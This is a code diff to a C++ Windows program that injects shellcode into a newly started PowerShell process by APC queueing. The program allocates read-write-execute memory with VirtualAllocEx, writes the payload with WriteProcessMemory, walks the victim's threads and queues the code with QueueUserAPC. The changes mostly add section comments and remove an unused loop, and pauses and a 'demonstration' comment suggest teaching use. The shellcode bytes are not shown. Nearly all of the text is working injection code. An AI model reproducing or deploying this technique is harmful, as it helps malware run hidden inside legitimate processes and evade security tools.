@@ -42,7 +42,6 @@ unsigned char shellcode[] = {
 
 int main() {
 	HANDLE victimProcess = NULL;
-	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
 	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
 	std::vector<DWORD> threadIds;
 	SIZE_T shellSize = sizeof(shellcode);
@@ -54,6 +53,7 @@ int main() {
 	STARTUPINFOA si = { sizeof(si) };
 	PROCESS_INFORMATION pi;
 
+	// - SECTION 1: Start the victim process
 	LPCSTR command = "powershell.exe -NoExit";  // Opens PowerShell and keeps it open
 
 	// Start the Powershell process
@@ -76,43 +76,40 @@ int main() {
 		return EXIT_FAILURE;
 	}
 
+	// - SECTION 2: Take Snapshot of the running Threads
 	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
 
-	if (Process32First(snapshot, &processEntry)) {
-		do {
-			if (processEntry.th32ProcessID == pi.dwProcessId) { // Match created process ID
-				break; // processEntry now holds details of the process
-			}
-		} while (Process32Next(snapshot, &processEntry));
-	}
-
-	/* allocate bytes to process memory */
+	// - SECTION 3: Allocate memory space
 	printf("%s Now, we will allocate the memory for our injection\n", k);
 	system("pause");
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
 	system("pause");
 
-	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+	// - SECTION 4: Write Memory space
 	BOOL writeResult = WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);
 	if (!writeResult) {
 		printf("%s Failed to write shellcode. Error: %ld\n", e, GetLastError());
 		return EXIT_FAILURE;
 	}
 
+	// - SECTION 5: List the threads of the victim process
 	if (Thread32First(snapshot, &threadEntry)) {
 		do {
-			//printf("%s Owner process Id %ld\n", e, threadEntry.th32OwnerProcessID);
 			if (threadEntry.th32OwnerProcessID == pi.dwProcessId) {
 				threadIds.push_back(threadEntry.th32ThreadID);
 			}
 		} while (Thread32Next(snapshot, &threadEntry));
 	}
 
+	// - SECTION 6: Queue the shellcode in the threads APC queues for execution
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 	for (DWORD threadId : threadIds) {
 		printf("%s Queueing APC on the thread: %ld\n", k, threadId);
 		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
 		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+		
+		// For demonstration purposes, we will only inject one thread of the process
 		break;
 	}
 	system("pause");
